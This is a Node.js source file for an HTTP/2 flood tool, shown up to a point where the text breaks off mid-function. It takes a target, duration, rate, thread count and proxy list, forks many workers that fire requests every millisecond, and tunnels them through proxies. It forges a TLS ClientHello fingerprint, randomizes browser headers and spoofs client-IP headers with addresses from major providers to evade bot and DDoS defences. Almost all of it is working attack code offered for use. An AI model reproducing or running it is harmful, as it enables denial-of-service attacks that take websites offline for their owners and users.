const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
var colors = require("colors");
const HPACK = require("hpack");
const v8 = require("v8");
const os = require("os");

// ===== BROWSER HEADER POOLS DARI H1.JS =====
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'gzip, deflate',
  "gzip, deflate, br, zstd"
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store',
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, private',
  'max-age=300, must-revalidate',
  'no-store, max-age=0, private, must-revalidate',
  'public, max-age=10, s-maxage=10',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const refers = [
  "https://google.com",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://discord.com",
  "https://www.cloudflare.com",
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
];

const language_header = [
  "id-ID,id;q=0.9,en;q=0.8",
  "en-US,en;q=0.9,id;q=0.8",
  "en-GB,en;q=0.9",
  "ja-JP,ja;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8"
];

const fetch_site = [
  "same-origin", 
  "same-site", 
  "cross-site", 
  "none"
];

const fetch_mode = [
  "navigate", 
  "same-origin", 
  "no-cors", 
  "cors"
];

const fetch_dest = [
  "document", 
  "sharedworker", 
  "subresource", 
  "unknown", 
  "worker"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
  '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
  '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
  '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"'    
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"',
  '"Android"',
  '"iOS"'
];

const sec_ch_ua_mobile = [
  '?0',
  '?1',
  '?0'
];
// ===== END BROWSER HEADER POOLS =====

function randstr(length) {
    const safeLength = Math.min(length, SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH);
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < safeLength; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

// Fixed accept header to match fingerprint
const accept_header_fixed = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';

if (process.argv.length < 6) {
  console.log('node flooder target time rate thread proxy');
  process.exit();
}

// Exact cipher list from fingerprint
const ciphersList = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
];

const ciphers = ciphersList.join(':');

// Use random user agent from pool
function getRandomUserAgent() {
    return uap[Math.floor(Math.random() * uap.length)];
}

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha512'
];

const SignalsList = sigalgs.join(':');
const ecdhCurve = "X25519:P-256:P-384";
const tls_versions = ['TLSv1.2', 'TLSv1.3'];

const tlsExtensions = [
    {id: 65281, data: Buffer.from([0x00])},
    {id: 0},
    {id: 11, data: Buffer.from([0x01, 0x00, 0x01, 0x02])},
    {id: 10, data: Buffer.from([0x00, 0x06, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x18])},
    {id: 35, data: Buffer.from([])},
    {id: 5},
    {id: 16, data: Buffer.from([0x00, 0x0c, 0x02, 0x68, 0x32, 0x08, 0x68, 0x74, 0x74, 0x70, 0x2f, 0x31, 0x2e, 0x31])},
    {id: 23, data: Buffer.from([])},
    {id: 13},
    {id: 43, data: Buffer.from([0x00, 0x04, 0x03, 0x04, 0x03, 0x03])},
    {id: 45, data: Buffer.from([0x01, 0x01])},
    {id: 51},
    {id: 21, data: Buffer.alloc(484)}
];

const clientRandom = "21b69504955b117b14e49cccd3b41ca030aa14be2f8385dd5c54eac32d7a57db";
const sessionId = "78c66f0641bf3d173005f75cacf702aa18b15f334dc9cccc76cfd7c3d411bff7";

function createCustomClientHello() {
    const messageType = Buffer.from([0x01]);
    const tlsVersion = Buffer.from([0x03, 0x03]);
    const randomBytes = Buffer.from(clientRandom, 'hex');
    const sessionIdLength = Buffer.from([0x20]);
    const sessionIdBytes = Buffer.from(sessionId, 'hex');
    const cipherSuitesBytes = Buffer.alloc(2 + ciphersList.length * 2);
    cipherSuitesBytes.writeUInt16BE(ciphersList.length * 2, 0);
    for(let i = 0; i < ciphersList.length; i++) {
        cipherSuitesBytes.writeUInt16BE(0xc02f + i, 2 + i * 2);
    }
    const compressionMethods = Buffer.from([0x01, 0x00]);
    const extensionsLengthBytes = Buffer.alloc(2);
    let extensionsBuffer = Buffer.alloc(0);
    for(const ext of tlsExtensions) {
        const extType = Buffer.alloc(2);
        extType.writeUInt16BE(ext.id, 0);
        if(ext.data) {
            const extLength = Buffer.alloc(2);
            extLength.writeUInt16BE(ext.data.length, 0);
            extensionsBuffer = Buffer.concat([extensionsBuffer, extType, extLength, ext.data]);
        } else {
            extensionsBuffer = Buffer.concat([extensionsBuffer, extType, Buffer.from([0x00, 0x00])]);
        }
    }
    extensionsLengthBytes.writeUInt16BE(extensionsBuffer.length, 0);
    const clientHelloBody = Buffer.concat([
        tlsVersion,
        randomBytes,
        sessionIdLength,
        sessionIdBytes,
        cipherSuitesBytes,
        compressionMethods,
        extensionsLengthBytes,
        extensionsBuffer
    ]);
    const messageLength = Buffer.alloc(3);
    messageLength.writeUIntBE(clientHelloBody.length, 0, 3);
    const clientHelloMessage = Buffer.concat([messageType, messageLength, clientHelloBody]);
    const recordHeader = Buffer.from([0x16, 0x03, 0x01]);
    const recordLength = Buffer.alloc(2);
    recordLength.writeUInt16BE(clientHelloMessage.length, 0);
    return Buffer.concat([recordHeader, recordLength, clientHelloMessage]);
}

function applyTLSFingerprint(socket) {
    const originalWrite = socket.write;
    let firstWrite = true;
    socket.write = function(data, encoding, callback) {
        if (firstWrite && data[0] === 0x16) {
            firstWrite = false;
            return originalWrite.call(this, createCustomClientHello(), encoding, callback);
        }
        return originalWrite.call(this, data, encoding, callback);
    };
    return socket;
}

const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const http2Settings = {
    headerTableSize: 65536,
    enablePush: false,
    initialWindowSize: 6291456,
    maxHeaderListSize: 262144
};

const windowUpdateIncrement = 15663105;

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: false,
    secureOptions: secureOptions,
    minVersion: tls_versions[0],
    maxVersion: tls_versions[1]
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
colors.enable();

if (cluster.isMaster) {
    const MAX_RAM_PERCENTAGE = 95;
    const RESTART_DELAY = 1000;
    const RAM_CHECK_INTERVAL = 5000;

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            console.clear();
            console.log('Target: ' + process.argv[2]);
            console.log('Time: ' + process.argv[3]);
            console.log('Rate: ' + process.argv[4]);
            console.log('Thread(s): ' + process.argv[5]);
            console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };

    const ramMonitorInterval = setInterval(handleRAMUsage, RAM_CHECK_INTERVAL);
    const masterMemoryInterval = setInterval(() => {
        optimizeMemoryUsage();
    }, 60000);

    for (let counter = 1; counter <= args.threads; counter++) {
        console.clear();
        console.log('Target: ' + process.argv[2]);
        console.log('Time: ' + process.argv[3]);
        console.log('Rate: ' + process.argv[4]);
        console.log('Thread(s): ' + process.argv[5]);
        console.log(`ProxyFile: ${args.proxyFile} | Total: ${proxies.length}`);
        cluster.fork();
    }

    process.on('exit', () => {
        clearInterval(masterMemoryInterval);
        clearInterval(ramMonitorInterval);
    });
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 1);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const legitIP = generateLegitIP();
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\n` +
                       `Host: ${options.address}:443\r\n` +
                       `Connection: Keep-Alive\r\n` +
                       `Client-IP: ${legitIP}\r\n` + 
                       `X-Client-IP: ${legitIP}\r\n` +
                       `Via: 1.1 ${legitIP}\r\n` +
                       `\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);
        
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function createH2SettingsFrame() {
    const frameHeader = Buffer.alloc(9);
    const payload = Buffer.alloc(24);
    payload.writeUInt16BE(0x0001, 0);
    payload.writeUInt32BE(0x00010000, 2);
    payload.writeUInt16BE(0x0002, 6);
    payload.writeUInt32BE(0x00000000, 8);
    payload.writeUInt16BE(0x0004, 12);
    payload.writeUInt32BE(0x00600000, 14);
    payload.writeUInt16BE(0x0006, 18);
    payload.writeUInt32BE(0x00040000, 20);
    frameHeader.writeUIntBE(payload.length, 0, 3);
    frameHeader[3] = 0x04;
    frameHeader[4] = 0x00;
    frameHeader.writeUIntBE(0, 5, 4);
    return Buffer.concat([frameHeader, payload]);
}

function createH2WindowUpdateFrame(increment) {
    const frameHeader = Buffer.alloc(9);
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(increment, 0);
    frameHeader.writeUIntBE(payload.length, 0, 3);
    frameHeader[3] = 0x08;
    frameHeader[4] = 0x00;
    frameHeader.writeUIntBE(0, 5, 4);
    return Buffer.concat([frameHeader, payload]);
}

const H2_FRAME_TYPES = {
    DATA: 0x0,
    HEADERS: 0x1,
    PRIORITY: 0x2,
    RST_STREAM: 0x3,
    SETTINGS: 0x4,
    PUSH_PROMISE: 0x5,
    PING: 0x6,
    GOAWAY: 0x7,
    WINDOW_UPDATE: 0x8,
    CONTINUATION: 0x9
};

const H2_FLAGS = {
    END_STREAM: 0x1,
    END_HEADERS: 0x4,
    PADDED: 0x8,
    PRIORITY: 0x10
};

const SAFE_MEMORY_SETTINGS = {
    MAX_HEADER_SIZE: 8192,
    MAX_FRAME_SIZE: 16384,
    MAX_STRING_LENGTH: 1024,
    BUFFER_SAFETY_MARGIN: 256,
    MAX_CONCURRENT_REQUESTS: 50
};

function optimizeMemoryUsage() {
    if (global.gc) {
        try {
            global.gc();
        } catch (e) {}
    }
    try {
        v8.clearFunctionEntryPointFromTemplate();
        if (v8.writeHeapSnapshot) {
            const snapshotPath = `./temp_snapshot_${Date.now()}.heapsnapshot`;
            v8.writeHeapSnapshot(snapshotPath);
            try {
                fs.unlinkSync(snapshotPath);
            } catch (e) {}
        }
    } catch (e) {}
}

function safeHpackEncodeHeaders(headers) {
    try {
        const safeHeaders = {...headers};
        Object.keys(safeHeaders).forEach(name => {
            if (typeof safeHeaders[name] === 'string' && 
                safeHeaders[name].length > SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH) {
                safeHeaders[name] = safeHeaders[name].substring(0, SAFE_MEMORY_SETTINGS.MAX_STRING_LENGTH);
            }
        });
        const headersList = [];
        for (const [name, value] of Object.entries(safeHeaders)) {
            if (value !== undefined && value !== null) {
                headersList.push([name, value.toString()]);
            }
        }
        const encoder = new HPACK.Encoder();
        const encoded = encoder.encode(headersList);
        if (encoded.length > SAFE_MEMORY_SETTINGS.MAX_HEADER_SIZE) {
            return encoded.slice(0, SAFE_MEMORY_SETTINGS.MAX_HEADER_SIZE);
        }
        return encoded;
    } catch (err) {
        return Buffer.alloc(0);
    }
}

function createH2HeadersFrameWithEncoding(headers, streamId, endStream, priority) {
    try {
        const encodedHeaders = safeHpackEncodeHeaders(headers);
        const frameHeader = Buffer.alloc(9);
        let flags = 0;
        if (endStream) flags |= H2_FLAGS.END_STREAM;
        flags |= H2_FLAGS.END_HEADERS;
        if (priority) flags |= H2_FLAGS.PRIORITY;
        let priorityData = Buffer.alloc(0);
        if (priority) {
            priorityData = Buffer.alloc(5);
            const dependencyValue = priority.exclusive ? 0x80000000 | priority.dependsOn : priority.dependsOn;
            priorityData.writeUInt32BE(dependencyValue, 0);
            priorityData[4] = priority.weight - 1;
        }
        const length = Math.min(
            encodedHeaders.length + (priority ? 5 : 0),
            SAFE_MEMORY_SETTINGS.MAX_FRAME_SIZE - 9
        );
        frameHeader.writeUIntBE(length, 0, 3);
        frameHeader[3] = H2_FRAME_TYPES.HEADERS;
        frameHeader[4] = flags;
        frameHeader.writeUInt32BE(streamId, 5);
        return Buffer.concat([frameHeader, priorityData, encodedHeaders.slice(0, length - (priority ? 5 : 0))]);
    } catch (err) {
        const errorHeader = Buffer.alloc(9);
        errorHeader.writeUIntBE(0, 0, 3);
        errorHeader[3] = H2_FRAME_TYPES.HEADERS;
        errorHeader[4] = endStream ? H2_FLAGS.END_STREAM | H2_FLAGS.END_HEADERS : H2_FLAGS.END_HEADERS;
        errorHeader.writeUInt32BE(streamId, 5);
        return errorHeader;
    }
}

function createH2PriorityFrame(streamId, priority) {
    const frameHeader = Buffer.alloc(9);
    const priorityData = Buffer.alloc(5);
    const dependencyValue = priority.exclusive ? 0x80000000 | priority.dependsOn : priority.dependsOn;
    priorityData.writeUInt32BE(dependencyValue, 0);
    priorityData[4] = priority.weight - 1;
    frameHeader.writeUIntBE(5, 0, 3);
    frameHeader[3] = H2_FRAME_TYPES.PRIORITY;
    frameHeader[4] = 0;
    frameHeader.writeUInt32BE(streamId, 5);
    return Buffer.concat([frameHeader, priorityData]);
}

function createH2SettingsAckFrame() {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUIntBE(0, 0, 3);
    frameHeader[3] = H2_FRAME_TYPES.SETTINGS;
    frameHeader[4] = 0x1;
    frameHeader.writeUInt32BE(0, 5);
    return frameHeader;
}

const BROWSER_TIMING = {
    MIN_REQUEST_DELAY: 50,
    MAX_REQUEST_DELAY: 150,
    REQUEST_JITTER: 25,
    PARALLEL_REQUESTS: [2, 3, 4, 5, 6]
};

function generateBrowserFingerprint() {
    const screenSizes = [
        {width: 1366, height: 768},
        {width: 1920, height: 1080},
        {width: 2560, height: 1440},
        {width: 3440, height: 1440},
        {width: 3840, height: 2160}
    ];
    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    return {
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: language_header[Math.floor(Math.random() * language_header.length)],
            platform: ["Win32", "MacIntel", "Linux x86_64"][Math.floor(Math.random() * 3)],
            doNotTrack: Math.random() > 0.7 ? "1" : null,
            hardwareConcurrency: [2, 4, 6, 8, 12, 16][Math.floor(Math.random() * 6)]
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? "Chromium PDF Viewer" : null,
            Math.random() > 0.5 ? "Microsoft Edge PDF Viewer" : null,
            Math.random() > 0.5 ? "WebKit built-in PDF" : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: crypto.randomBytes(16).toString('hex'),
        canvas: crypto.randomBytes(16).toString('hex'),
        userActivation: Math.random() > 0.5
    };
}

function randomizeHeaders(baseHeaders) {
    const headers = {...baseHeaders};
    const fingerprint = generateBrowserFingerprint();
    headers["accept-language"] = fingerprint.navigator.language;
    headers["sec-ch-ua-platform"] = `"${fingerprint.navigator.platform.split(" ")[0]}"`;
    headers["sec-ch-ua"] = sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)];
    headers["sec-ch-ua-mobile"] = sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)];
    if (Math.random() > 0.7) {
        headers["device-memory"] = ["0.5", "1", "2", "4", "8"][Math.floor(Math.random() * 5)];
    }
    if (Math.random() > 0.7) {
        headers["viewport-width"] = fingerprint.screen.width.toString();
    }
    if (Math.random() > 0.8) {
        headers["sec-ch-ua-full-version-list"] = headers["sec-ch-ua"];
    }
    if (Math.random() > 0.6) {
        headers["sec-ch-prefers-color-scheme"] = Math.random() > 0.3 ? "light" : "dark";
    }
    if (Math.random() > 0.8) {
        headers["accept"] = accept_header_fixed;
    }
    headers["user-agent"] = getRandomUserAgent();
    return headers;
}

function simulateBrowserNavigation(client, baseHeaders, parsedTarget) {
    const resourceTypes = [
        { path: '/style.css', type: 'style' },
        { path: '/script.js', type: 'script' },
        { path: '/favicon.ico', type: 'image' },
        { path: '/logo.png', type: 'image' }
    ];
    setTimeout(() => {
        for (const resource of resourceTypes) {
            if (Math.random() > 0.5) {
                const resourceHeaders = {...baseHeaders};
                resourceHeaders[':path'] = parsedTarget.path + resource.path;
                resourceHeaders['sec-fetch-dest'] = resource.type;
                resourceHeaders['sec-fetch-mode'] = 'no-cors';
                const request = client.request(resourceHeaders, {
                    endStream: true,
                    exclusive: true,
                    parent: 0,
                    weight: 256,
                    waitForTrailers: false
                });
                request.on("response", response => {
                    request.close();
                    request.destroy();
                    return;
                });
                request.end();
                setTimeout(() => {}, Math.random() * 100);
            }
        }
    }, 300 + Math.random() * 200);
}

function getRandomDelay() {
    const baseDelay = Math.random() * (BROWSER_TIMING.MAX_REQUEST_DELAY - BROWSER_TIMING.MIN_REQUEST_DELAY) + BROWSER_TIMING.MIN_REQUEST_DELAY;
    const jitter = (Math.random() * 2 - 1) * BROWSER_TIMING.REQUEST_JITTER;
    return baseDelay + jitter;
}

function modifyTcpOptions(socket) {
    return socket;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function removeXForwardedHeaders(headers) {
    const cleanedHeaders = {...headers};
    const forwardedHeaders = [
        "x-forwarded-for",
        "x-forwarded-host",
        "x-forwarded-proto",
        "forwarded",
        "x-real-ip",
        "x-originating-ip",
        "cf-connecting-ip",
        "true-client-ip"
    ];
    forwardedHeaders.forEach(header => {
        if (cleanedHeaders[header]) {
            delete cleanedHeaders[header];
        }
    });
    return cleanedHeaders;
}

function generateAlternativeIPHeaders() {
    const headers = {};
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }
    return headers;
}

function checkHeapStatus() {
    const heapStats = v8.getHeapStatistics();
    const heapSizeLimit = heapStats.heap_size_limit;
    const totalHeapSize = heapStats.total_heap_size;
    const usedHeapSize = heapStats.used_heap_size;
    if (usedHeapSize > totalHeapSize * 0.8) {
        optimizeMemoryUsage();
    }
    return {
        usedPercent: Math.round((usedHeapSize / heapSizeLimit) * 100),
        totalHeapSize: Math.round(totalHeapSize / (1024 * 1024)) + ' MB',
        usedHeapSize: Math.round(usedHeapSize / (1024 * 1024)) + ' MB'
    };
}

const STANDARD_URI_PATHS = [
    '/',
    '/index.html',
    '/home',
    '/dashboard',
    '/api/v1/status',
    '/assets/main.js',
    '/css/style.css'
];

const COMMON_URL_PARAMS = [
    'page=1',
    't=' + Date.now(),
    'v=' + Math.random().toString(36).substring(7),
    'session=' + randstr(16)
];

const STANDARD_HEADER_SETS = [
    {
        "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    },
    {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.5",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive",
        "upgrade-insecure-requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "pragma": "no-cache",
        "cache-control": "no-cache"
    },
    {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive"
    },
    {
        "sec-ch-ua": "\"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }
];

function generateLegitPath(baseUrl, originalPath) {
    if (Math.random() < 0.5 && originalPath && originalPath !== '/') {
        let path = originalPath;
        if (Math.random() < 0.2 && !path.includes('?')) {
            path += '?' + randomElement(COMMON_URL_PARAMS);
        }
        return path;
    }
    const parsedUrl = new URL(baseUrl);
    const hostname = parsedUrl.hostname;
    let path = randomElement(STANDARD_URI_PATHS);
    if (Math.random() < 0.3) {
        path += '?' + randomElement(COMMON_URL_PARAMS);
        if (Math.random() < 0.2) {
            path += '&' + randomElement(COMMON_URL_PARAMS);
        }
    }
    if (Math.random() < 0.4) {
        const domainParts = hostname.split('.');
        let mainDomain = domainParts.length >= 2 ? domainParts[domainParts.length - 2] : hostname;
        mainDomain = mainDomain.replace(/[^a-zA-Z0-9]/g, '');
        const domainPaths = [
            `/${mainDomain}/home`,
            `/${mainDomain}-assets/main.js`,
            `/${mainDomain}/images/logo.png`,
            `/wp-content/themes/${mainDomain}/style.css`,
            `/assets/${mainDomain}/css/styles.min.css`
        ];
        path = randomElement(domainPaths);
    }
    return path;
}

function getStandardBrowserHeaders(targetHost, originalPath) {
    const baseHeaderSet = {...randomElement(STANDARD_HEADER_SETS)};
    const headers = {
        ":method": "GET",
        ":authority": targetHost,
        ":scheme": "https",
        ":path": generateLegitPath(`https://${targetHost}/`, originalPath),
        ...generateAlternativeIPHeaders(),
        "user-agent": getRandomUserAgent(),
        "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
